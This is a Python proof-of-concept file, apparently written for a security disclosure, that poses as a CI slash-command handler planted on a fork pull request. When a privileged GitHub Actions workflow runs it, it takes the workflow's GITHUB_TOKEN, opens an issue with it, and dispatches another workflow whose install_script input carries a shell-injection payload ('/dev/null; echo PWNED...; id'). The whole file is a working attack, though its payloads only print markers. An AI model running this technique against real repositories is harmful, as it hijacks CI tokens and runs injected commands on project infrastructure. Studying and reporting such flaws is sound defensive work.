"""Attacker-controlled replacement of scripts/ci/utils/slash_command_handler.py.

Deployed on the *fork PR head*. Executed by the privileged issue_comment
workflow after it checks out refs/pull/N/head because the commenter holds
write permission.
"""
import json
import os
import urllib.error
import urllib.request

TOKEN = os.environ["GITHUB_TOKEN"]
REPO = os.environ["REPO_FULL_NAME"]

print("=== ATTACKER CODE EXECUTING IN issue_comment WORKFLOW ===")
print("actor:", os.environ.get("USER_LOGIN"), "| comment:", os.environ.get("COMMENT_BODY", "")[:40])
print("cwd:", os.getcwd())

def api(method, path, payload=None):
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(
        "https://api.github.com" + path,
        data=data,
        method=method,
        headers={
            "Authorization": f"Bearer {TOKEN}",
            "Accept": "application/vnd.github+json",
            "X-GitHub-Api-Version": "2022-11-28",
        },
    )
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, r.read().decode()[:400]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:400]
    except Exception as e:  # noqa: BLE001
        return 0, str(e)

# issues: write
st, body = api("POST", f"/repos/{REPO}/issues",
               {"title": "poc2: attacker code ran in issue_comment workflow",
                "body": "The privileged slash-command handler executed PR-head code."})
print("issues:write ->", st)

# actions: write -> dispatch the rerun-test workflow with a shell-injection payload
st2, body2 = api("POST", f"/repos/{REPO}/actions/workflows/poc2-rerun-test.yml/dispatches",
                 {"ref": "main",
                  "inputs": {"mode": "cuda",
                             "test_command": "x",
                             "runs_on": "ubuntu-latest",
                             "install_script": "/dev/null; echo PWNED-FROM-INSTALL-SCRIPT; id; echo GHT_LEN=${#TOKEN}"}})
print("actions:write dispatch ->", st2, body2)
